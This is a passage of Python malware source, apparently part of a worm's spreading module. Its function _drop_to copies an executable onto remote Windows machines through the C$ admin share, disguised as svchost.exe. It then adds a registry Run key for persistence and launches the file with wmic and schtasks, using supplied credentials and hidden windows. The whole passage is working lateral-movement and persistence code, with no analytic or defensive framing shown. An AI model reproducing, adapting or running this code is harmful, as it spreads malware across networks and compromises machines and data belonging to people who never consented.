              except Exception: return False

          def _drop_to(ip, user, pw):
              base = f"\\\\{ip}\\C$"
              win  = r"C:\Windows\Temp\svchost.exe"
              dst  = base + r"\Windows\Temp\svchost.exe"
              try:
                  r = subprocess.run(f'copy /y "{SPREAD_EXE}" "{dst}"', shell=True,
                                     capture_output=True, creationflags=NO_WIN, timeout=300)
                  if r.returncode != 0 or not os.path.exists(dst):
                      win = r"C:\Users\Public\svchost.exe"
                      dst = base + r"\Users\Public\svchost.exe"
                      subprocess.run(f'copy /y "{SPREAD_EXE}" "{dst}"', shell=True,
                                     capture_output=True, creationflags=NO_WIN, timeout=300)
              except Exception: return False
              if not os.path.exists(dst): return False
              try:
                  subprocess.run(f'reg add "{base}\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                                 f'/v svchost /t REG_SZ /d "{win}" /f', shell=True,
                                 capture_output=True, creationflags=NO_WIN, timeout=25)
              except Exception: pass
              wc = f' /user:"{user}" /password:"{pw}"' if user else ""
              sc2 = f' /u "{user}" /p "{pw}"' if user else ""
              for cmd in (f'wmic /node:"{ip}"{wc} process call create "{win}"',
                          f'schtasks /s {ip}{sc2} /create /tn svchost /tr "{win}" /sc onlogon /f',
                          f'schtasks /s {ip}{sc2} /run /tn svchost'):
                  try:
                      subprocess.run(cmd, shell=True, capture_output=True,
                                     creationflags=NO_WIN, timeout=60)
                  except Exception: pass
              _log(f"LAN ok: {ip} ({user or 'session'})")
              return True

          def _spread_host(ip):
